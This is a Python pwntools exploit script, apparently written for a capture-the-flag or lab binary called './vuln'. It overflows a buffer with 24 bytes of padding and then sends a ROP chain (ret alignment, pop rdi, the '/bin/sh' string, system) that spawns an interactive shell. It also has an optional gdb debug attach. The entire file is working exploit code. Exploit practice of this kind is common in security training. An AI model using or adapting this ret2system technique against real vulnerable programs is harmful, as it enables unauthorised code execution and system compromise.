from pwn import *
import sys

context.binary = elf = ELF("./vuln")
rop = ROP(elf)
io = process("./vuln")

if len(sys.argv) == 2:
    if sys.argv[1] == "debug":
        context.terminal = ["tmux", "splitw", "-h"]
        gdb_commands = """
            break *0x0000000000401868
        """
        gdb.attach(io, gdb_commands)

print(io.recvuntil(b"Enter your name: "))

# *************** EXPLOIT PART *************** #

payload = b""

padding = b"A" * 24

rop_chain = b""

bin_sh = p64(next(elf.search(b"/bin/sh")))
system = p64(elf.sym['system'])
pop_rdi = p64(rop.find_gadget(["pop rdi", "ret"])[0])
align_gadget = p64(rop.find_gadget(["ret"])[0])

rop_chain += align_gadget + pop_rdi + bin_sh + system

payload += padding + rop_chain

# *************** EXPLOIT END *************** #

io.sendline(payload)

io.interactive()
